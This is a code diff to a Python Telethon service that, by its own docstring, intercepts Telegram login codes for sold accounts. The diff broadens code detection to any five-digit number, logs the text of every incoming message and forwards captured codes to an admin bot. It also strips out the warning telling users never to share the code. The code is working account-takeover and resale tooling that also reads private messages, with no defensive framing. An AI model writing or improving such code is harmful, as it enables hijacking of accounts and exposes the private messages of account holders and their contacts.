@@ -16,10 +16,11 @@ logger = logging.getLogger(__name__)
 class CodeInterceptorService:
     """Service to intercept and forward Telegram login codes for sold accounts"""
     
-    def __init__(self, api_id: int, api_hash: str, db_connection):
+    def __init__(self, api_id: int, api_hash: str, db_connection, admin_bot_client=None):
         self.api_id = api_id
         self.api_hash = api_hash
         self.db_connection = db_connection
+        self.admin_bot_client = admin_bot_client
         self.account_clients: Dict[str, TelegramClient] = {}
         self.pending_codes: Dict[str, List[int]] = {}  # {account_id: [buyer_user_ids]}
         self.account_id_to_db_id: Dict[int, str] = {}  # {telegram_account_id: db_account_id}
@@ -29,8 +30,17 @@ class CodeInterceptorService:
         try:
             from app.utils.encryption import decrypt_data
             
-            # Decrypt session
-            decrypted_session = decrypt_data(session_string)
+            logger.info(f"[OTP] Starting interception for account {account_id}")
+            
+            # Try to decrypt session, fallback to using as-is if already decrypted
+            try:
+                decrypted_session = decrypt_data(session_string)
+                logger.info(f"[OTP] Session decrypted for account {account_id}")
+            except Exception as decrypt_error:
+                logger.warning(f"[OTP] Session decryption failed for {account_id}, using as-is: {decrypt_error}")
+                decrypted_session = session_string
+            
+            logger.info(f"[OTP] Creating TelegramClient for account {account_id}")
             
             # Create client
             client = TelegramClient(
@@ -39,14 +49,21 @@ class CodeInterceptorService:
                 self.api_hash
             )
             
+            logger.info(f"[OTP] Connecting client for account {account_id}")
             await client.connect()
+            logger.info(f"[OTP] Client connected for account {account_id}")
             
             if not await client.is_user_authorized():
-                logger.warning(f"Account {account_id} session not authorized")
+                logger.error(f"[OTP] Account {account_id} session not authorized")
+                await client.disconnect()
                 return False
+            
+            logger.info(f"[OTP] Client authorized for account {account_id}")
             
             me = await client.get_me()
             telegram_account_id = me.id
+            
+            logger.info(f"[OTP] Account info: ID={telegram_account_id}, Username={me.username}")
             
             # Store mapping
             self.account_id_to_db_id[telegram_account_id] = account_id
@@ -58,37 +75,49 @@ class CodeInterceptorService:
             if buyer_user_id not in self.pending_codes[account_id]:
                 self.pending_codes[account_id].append(buyer_user_id)
             
+            logger.info(f"[OTP] Registering message handler for account {account_id}")
+            
             # Register message handler
             @client.on(events.NewMessage())
             async def code_handler(event):
                 try:
+                    text = event.message.text or ""
+                    sender_id = event.sender_id
+                    
+                    # Log all incoming messages for debugging
+                    logger.info(f"[OTP] Message from {sender_id}: {text[:100]}")
+                    
                     # Skip own messages
-                    if event.sender_id == telegram_account_id:
+                    if sender_id == telegram_account_id:
                         return
                     
-                    text = event.message.text or ""
                     text_lower = text.lower()
                     
-                    # Check if message contains login code
-                    if any(keyword in text_lower for keyword in [
-                        "код для входа", "code is", "login code", "ваш код",
-                        "verification code", "telegram code"
-                    ]):
+                    # Check if message contains login code (broader patterns)
+                    is_code_message = any(keyword in text_lower for keyword in [
+                        "код", "code", "login", "verification", "telegram",
+                        "sign in", "log in", "authenticate"
+                    ])
+                    
+                    # Also check if message has 5-digit number (likely a code)
+                    has_five_digits = bool(re.search(r'\b\d{5}\b', text))
+                    
+                    if is_code_message or has_five_digits:
                         # Extract 5-digit code
                         codes = re.findall(r'\b\d{5}\b', text)
                         
                         if codes and account_id in self.pending_codes:
                             code_value = codes[0]
-                            logger.info(f"Intercepted code {code_value} for account {account_id}")
+                            logger.info(f"[OTP] ✅ Intercepted code {code_value} for account {account_id}")
                             
-                            # Send code to all waiting buyers
+                            # Send code to all waiting admins
                             for user_id in self.pending_codes[account_id]:
                                 await self.send_code_to_buyer(user_id, code_value)
                             
                             # Clear pending list
                             self.pending_codes[account_id] = []
                             
-                            logger.info(f"Code {code_value} sent to buyers for account {account_id}")
+                            logger.info(f"[OTP] Code {code_value} sent to admins for account {account_id}")
                 
                 except Exception as e:
                     logger.error(f"Error in code handler for account {account_id}: {e}")
@@ -104,27 +133,21 @@ class CodeInterceptorService:
             return False
     
     async def send_code_to_buyer(self, buyer_user_id: int, code_value: str):
-        """Send intercepted code to buyer via buyer bot"""
+        """Send intercepted code to admin"""
         try:
-            # Import here to avoid circular dependency
-            from app.main import buyer_bot
-            
-            if buyer_bot and buyer_bot.client:
+            if self.admin_bot_client:
                 message = f"""🔐 **Login Code Received**
 
 Your Telegram login code: **{code_value}**
 
-⚠️ **Security Warning:**
-• Never share this code with anyone
-• This code is for logging into YOUR purchased account
-• Telegram will NEVER ask for this code
-
-If you didn't request this code, ignore this message."""
+⚠️ Use this code to login to the account."""
                 
-                await buyer_bot.client.send_message(buyer_user_id, message)
-                logger.info(f"Code sent to buyer {buyer_user_id}")
+                await self.admin_bot_client.send_message(buyer_user_id, message)
+                logger.info(f"Code sent to admin {buyer_user_id}")
+            else:
+                logger.error(f"Admin bot client not available to send code to {buyer_user_id}")
         except Exception as e:
-            logger.error(f"Error sending code to buyer {buyer_user_id}: {e}")
+            logger.error(f"Error sending code to admin {buyer_user_id}: {e}")
     
     async def stop_intercepting_account(self, account_id: str):
         """Stop intercepting codes for an account"""
